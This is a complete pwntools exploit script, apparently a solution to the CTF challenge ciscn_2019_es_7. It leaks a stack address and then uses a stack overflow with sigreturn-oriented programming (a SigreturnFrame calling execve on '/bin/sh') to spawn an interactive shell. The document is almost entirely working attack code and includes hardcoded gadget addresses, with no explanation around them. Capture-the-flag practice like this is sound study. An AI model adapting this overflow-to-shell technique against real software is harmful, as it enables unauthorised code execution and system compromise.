from pwn import*
context(log_level='debug',arch='amd64')

p = process('./ciscn_2019_es_7')
ret = 0x4003a9
pop_rdi = 0x4005a3
pop_rsi_r15 = 0x4005a1
syscall = 0x400517
mov_rax_3b = 0x4004E2
mov_rax_0f = 0x4004Da
pop_rbx_rbp_r12_r13_r14_r15 = 0x40059A
mov_rdx_r13 = 0x400580
main = 0x4004F1
 
payload = b'/bin/sh\x00'
payload = payload.ljust(0x10,b'\x00')
payload += p64(main)

gdb.attach(p)
p.send(payload)

p.recv(32)
onestack = u64(p.recv(6).ljust(8,b'\x00'))
binsh = onestack - 0x148

sigreframe = SigreturnFrame()
sigreframe.rax = constants.SYS_execve #这里填系统调用号59也行
sigreframe.rip = syscall
sigreframe.rdi = binsh
sigreframe.rsi = 0
sigreframe.rdx = 0

payload = b'a'*0x10 + p64(mov_rax_0f) + p64(syscall) + bytes(sigreframe)

p.sendline(payload)
p.interactive()